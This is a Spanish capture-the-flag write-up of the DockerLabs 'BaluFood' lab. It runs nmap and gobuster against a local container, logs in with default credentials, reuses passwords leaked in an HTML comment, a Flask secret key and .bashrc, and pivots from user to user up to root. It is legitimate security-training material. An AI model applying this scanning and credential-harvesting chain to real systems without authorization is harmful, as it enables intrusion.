---
title: "DockerLabs - BaluFood"
difficulty: "Fácil"
source: "DockerLabs"
---

Página web de un restaurante con data leakage y escalada de privilegios en Linux con user pivoting.

## Despliegue

```bash
bash auto_deploy.sh balufood.tar
```

## Reconocimiento

```bash
nmap -sCV -p- 172.17.0.2
```

Puertos detectados:
- **22/tcp** — SSH (OpenSSH)
- **5000/tcp** — HTTP (Flask/Werkzeug) — página web de restaurante

## Enumeración Web

```bash
gobuster dir -u http://172.17.0.2:5000 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

Directorios encontrados: `/login`, `/admin`

## Data Leakage — Credenciales admin

Credenciales por defecto en `/login`:

```
admin:admin
```

En el código fuente HTML del panel `/admin` hay un comentario con credenciales de backup:

```html
<!-- sysadmin:backup123 -->
```

## Intrusión — sysadmin

```bash
ssh sysadmin@172.17.0.2
# contraseña: backup123
```

## Data Leakage — Secret Key Flask

En el home de sysadmin, `app.py` tiene la secret key hardcodeada:

```python
app.secret_key = 'cuidaditocuidadin'
```

## User Pivoting — sysadmin → balulero

```bash
su balulero
# contraseña: cuidaditocuidadin
```

## Escalada de Privilegios — balulero → root

En `/home/balulero/.bashrc` está la contraseña de root:

```bash
cat /home/balulero/.bashrc
# contraseña de root: chocolate2
```

```bash
su root
# contraseña: chocolate2
whoami
# root
```

## Conclusión

Cadena de ataque: credenciales por defecto → comentario HTML con SSH credentials → SSH como sysadmin → secret key en app.py → contraseña de balulero → contraseña de root en .bashrc → root.
